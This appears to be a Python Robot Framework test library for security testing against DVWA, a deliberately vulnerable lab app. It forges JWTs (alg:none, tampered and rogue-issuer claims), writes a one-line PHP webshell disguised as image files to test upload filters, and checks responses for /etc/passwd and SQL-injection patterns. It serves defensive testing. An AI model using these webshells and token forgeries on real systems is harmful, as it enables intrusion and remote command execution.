"""
SecurityUtils.py — Robot Framework custom library for security testing utilities.
Provides helpers for JWT manipulation, payload construction, and response validation.
Target: DVWA (Damn Vulnerable Web Application) running via Docker.
"""

import base64
import json
import time
import requests


class SecurityUtils:

    ROBOT_LIBRARY_SCOPE = "GLOBAL"

    # ------------------------------------------------------------------ #
    #  Session helpers                                                     #
    # ------------------------------------------------------------------ #

    def authenticate_and_get_session(self, base_url, username="admin", password="password"):
        """Log into DVWA and return the session cookie dict."""
        session = requests.Session()

        # Fetch login page to grab CSRF token
        login_page = session.get(f"{base_url}/login.php")
        token = self._extract_csrf_token(login_page.text)

        resp = session.post(
            f"{base_url}/login.php",
            data={
                "username": username,
                "password": password,
                "Login": "Login",
                "user_token": token,
            },
            allow_redirects=True,
        )

        if "Login failed" in resp.text:
            raise AssertionError(f"DVWA login failed for user '{username}'")

        # Set the security level to LOW so all vulnerabilities are exposed
        session.get(
            f"{base_url}/security.php",
            params={"seclev_submit": "Submit", "security": "low"},
        )

        return dict(session.cookies)

    def get_csrf_token_from_page(self, base_url, path, cookies):
        """Fetch a page and extract the CSRF user_token hidden field."""
        resp = requests.get(f"{base_url}{path}", cookies=cookies)
        return self._extract_csrf_token(resp.text)

    def _extract_csrf_token(self, html):
        """Pull user_token value from DVWA HTML."""
        import re
        match = re.search(r"user_token.*?value=['\"]([a-f0-9]+)['\"]", html, re.IGNORECASE)
        return match.group(1) if match else ""

    # ------------------------------------------------------------------ #
    #  JWT helpers                                                         #
    # ------------------------------------------------------------------ #

    def decode_jwt_payload(self, token):
        """Decode and return the JWT payload as a dict (no signature verification)."""
        parts = token.replace("Bearer ", "").split(".")
        if len(parts) < 2:
            raise AssertionError(f"Not a valid JWT — expected 3 parts, got {len(parts)}")

        payload_b64 = parts[1]
        # Add padding if needed
        payload_b64 += "=" * (4 - len(payload_b64) % 4)
        payload = json.loads(base64.b64decode(payload_b64).decode("utf-8"))
        return payload

    def build_alg_none_token(self, valid_token):
        """
        Take a real JWT and rebuild it with alg:none header and no signature.
        This is the classic 'alg:none' attack — a secure server must reject it.
        """
        token = valid_token.replace("Bearer ", "")
        parts = token.split(".")

        # Build new header with alg=none
        new_header = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).rstrip(b"=").decode()

        # Keep original payload, empty signature
        return f"{new_header}.{parts[1]}."

    def build_tampered_payload_token(self, valid_token, claim_key, claim_value):
        """
        Decode the JWT payload, change one claim, re-encode — keep ORIGINAL signature.
        A secure server must reject because the signature no longer matches the payload.
        """
        token = valid_token.replace("Bearer ", "")
        parts = token.split(".")

        # Decode original payload
        payload = self.decode_jwt_payload(token)
        payload[claim_key] = claim_value

        # Re-encode payload (original signature stays — signature is now INVALID)
        new_payload = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).rstrip(b"=").decode()

        return f"{parts[0]}.{new_payload}.{parts[2]}"

    def build_rogue_issuer_token(self, valid_token, rogue_issuer="attacker.com"):
        """Swap the 'iss' claim to a rogue issuer — keep original signature."""
        return self.build_tampered_payload_token(valid_token, "iss", rogue_issuer)

    def verify_jwt_has_required_claims(self, token, required_claims=None):
        """Assert that the JWT payload contains all required standard claims."""
        if required_claims is None:
            required_claims = ["exp", "iss", "iat"]

        payload = self.decode_jwt_payload(token)
        missing = [c for c in required_claims if c not in payload]

        if missing:
            raise AssertionError(f"JWT is missing required claims: {missing}. Payload: {payload}")

        # Validate exp is in the future
        if "exp" in payload and payload["exp"] < time.time():
            raise AssertionError(f"JWT is already expired. exp={payload['exp']}, now={int(time.time())}")

        return payload

    # ------------------------------------------------------------------ #
    #  File helpers                                                        #
    # ------------------------------------------------------------------ #

    def create_php_webshell_file(self, path="/tmp/shell.php"):
        """Write a minimal PHP webshell to disk for upload testing."""
        with open(path, "w") as f:
            f.write("<?php system($_GET['cmd']); ?>")
        return path

    def create_php_disguised_as_image(self, path="/tmp/shell.php.jpg"):
        """Double-extension bypass: PHP code with .jpg extension."""
        with open(path, "w") as f:
            f.write("<?php system($_GET['cmd']); ?>")
        return path

    def create_gif_with_php_payload(self, path="/tmp/shell.gif"):
        """Magic bytes bypass: GIF89a header + PHP payload."""
        with open(path, "wb") as f:
            f.write(b"GIF89a")
            f.write(b"<?php system($_GET['cmd']); ?>")
        return path

    def upload_file(self, base_url, upload_path, file_path, cookies,
                    content_type="application/octet-stream"):
        """POST a file to DVWA upload endpoint and return the response."""
        import os
        filename = os.path.basename(file_path)

        with open(file_path, "rb") as f:
            files = {"uploaded": (filename, f, content_type)}
            resp = requests.post(
                f"{base_url}{upload_path}",
                files=files,
                data={"Upload": "Upload"},
                cookies=cookies,
            )
        return resp

    # ------------------------------------------------------------------ #
    #  Response assertion helpers                                          #
    # ------------------------------------------------------------------ #

    def response_should_not_expose_system_data(self, response_text):
        """Assert response doesn't contain /etc/passwd content or OS command output."""
        forbidden_patterns = [
            "root:x:0:0",       # /etc/passwd
            "uid=",             # id command output
            "www-data",         # whoami
            "/bin/bash",        # shell path
            "total ",           # ls -la header
        ]
        for pattern in forbidden_patterns:
            if pattern in response_text:
                raise AssertionError(
                    f"Response exposed system data — found '{pattern}' in response.\n"
                    f"Response (first 500 chars): {response_text[:500]}"
                )

    def response_should_not_expose_db_data(self, response_text):
        """Assert response doesn't contain database dump content."""
        forbidden_patterns = [
            "@",                # email addresses
            "password",         # password field
            "DROP TABLE",       # DDL reflected back
            "UNION SELECT",     # query reflected back
        ]
        for pattern in forbidden_patterns:
            if pattern.lower() in response_text.lower():
                raise AssertionError(
                    f"Response may expose DB data — found '{pattern}' in response."
                )

    def measure_response_time(self, base_url, path, cookies=None, timeout=10):
        """Return response time in seconds for a GET request."""
        start = time.time()
        requests.get(f"{base_url}{path}", cookies=cookies, timeout=timeout)
        return time.time() - start

    def response_time_should_be_less_than(self, elapsed, max_seconds):
        """Fail if response took longer than max_seconds (time-based injection check)."""
        if float(elapsed) >= float(max_seconds):
            raise AssertionError(
                f"Response took {elapsed:.2f}s — exceeds {max_seconds}s threshold. "
                f"Possible time-based injection."
            )
